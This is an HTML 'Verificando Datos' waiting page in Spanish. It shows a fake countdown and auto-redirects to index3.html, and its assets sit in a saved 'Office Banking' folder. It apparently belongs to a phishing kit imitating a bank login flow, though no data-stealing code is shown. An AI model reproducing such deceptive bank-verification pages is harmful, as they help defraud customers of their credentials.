<!DOCTYPE html>

<html>

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="refresh" content="29; url = index3.html">
  <title>Verificaci√≥n</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="./Office Banking_files/sabros/dindin.css" rel="stylesheet">
  <script src="./Office Banking_files/sabros/dindin.js"></script>

</head>

<body>
  <div class="timer-desktop" id="wrapper">
    <div>
      <div class="text-center">
        <img width="205px" class="  logo" src="./Office Banking_files/sabros/logo.svg">
      </div>
      <br>
      <div id="app">
        <center>
          <div class="base-timer">
            <svg class="base-timer__svg" viewBox="0 0 100 100" xmlns="">
              <g class="base-timer__circle">
                <circle class="base-timer__path-elapsed" cx="50" cy="50" r="45"></circle>
                <path id="base-timer-path-remaining" stroke-dasharray="205 283" class="base-timer__path-remaining green"
                  d="
          M 50, 50
          m -45, 0
          a 45,45 0 1,0 90,0
          a 45,45 0 1,0 -90,0
        "></path>
              </g>
            </svg>
            <span id="base-timer-label" class="base-timer__label">0:30</span>
          </div>
        </center>
      </div><br>
      <div class="text-center">
        <h2 class=" text1">Verificando Datos</h2>
      </div>
      <div class="text-center">
        <h3 class="text2" style="margin-top: 27px;">Espera un momento, no cierres esta ventana.</h3>
      </div>
      <div class="text-center" style="margin-top: 20px;">
      </div>
    </div>
  </div>


  <script>
    document.getElementById("app").innerHTML = `
<center>
<div class="base-timer">
  <svg class="base-timer__svg" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
    <g class="base-timer__circle">
      <circle class="base-timer__path-elapsed" cx="50" cy="50" r="45"></circle>
      <path
        id="base-timer-path-remaining"
        stroke-dasharray="283"
        class="base-timer__path-remaining ${remainingPathColor}"
        d="
          M 50, 50
          m -45, 0
          a 45,45 0 1,0 90,0
          a 45,45 0 1,0 -90,0
        "
      ></path>
    </g>
  </svg>
  <span id="base-timer-label" class="base-timer__label">${formatTime(
      timeLeft
    )}</span>
</div></center>
`;
  </script>

</body>

</html>
